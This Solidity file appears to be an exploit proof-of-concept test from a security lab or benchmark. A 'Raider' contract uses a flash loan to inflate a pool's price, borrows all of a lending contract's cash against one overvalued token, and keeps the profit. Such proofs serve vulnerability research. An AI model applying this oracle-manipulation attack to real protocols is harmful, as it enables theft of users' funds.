pragma solidity ^0.8.20;

import {ExploitProof} from "@proof/ExploitProof.sol";
import {Coin, MirrorPool, QuickLoan, PawnShop} from "@contracts/HallOfMirrors.sol";

contract Raider {
    QuickLoan lender;
    MirrorPool pool;
    PawnShop shop;
    Coin stake;
    Coin cash;

    constructor(QuickLoan _lender, MirrorPool _pool, PawnShop _shop, Coin _stake, Coin _cash) {
        lender = _lender;
        pool = _pool;
        shop = _shop;
        stake = _stake;
        cash = _cash;
    }

    function attack() external {
        uint256 borrowAmount = cash.balanceOf(address(lender));
        lender.borrow(borrowAmount, "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external {
        cash.approve(address(pool), type(uint256).max);
        stake.approve(address(pool), type(uint256).max);
        stake.approve(address(shop), type(uint256).max);

        uint256 stakeOut = pool.swapCashForStake(amount);

        shop.pledge(1e18);

        uint256 maxCash = cash.balanceOf(address(shop));
        shop.draw(maxCash);

        pool.swapStakeForCash(stakeOut - 1e18);

        cash.transfer(address(lender), amount);
        cash.transfer(msg.sender, cash.balanceOf(address(this)));
    }
}

contract ProveHallOfMirrorsLeadOne is ExploitProof {
    function test_exploit() external {
        Coin stake = new Coin("Stake");
        Coin cash = new Coin("Cash");

        MirrorPool pool = new MirrorPool(stake, cash);
        QuickLoan lender = new QuickLoan(cash);
        PawnShop shop = new PawnShop(stake, cash, pool);

        stake.mint(address(this), 10_000e18);
        cash.mint(address(this), 10_000e18);
        cash.mint(address(lender), 50_000e18);

        stake.approve(address(pool), 10_000e18);
        cash.approve(address(pool), 10_000e18);
        pool.seed(1_000e18, 1_000e18);

        Raider raider = new Raider(lender, pool, shop, stake, cash);
        stake.mint(address(raider), 1e18);

        raider.attack();

        profit = cash.balanceOf(address(raider));
        assertExploitLanded(1e18);
    }
}

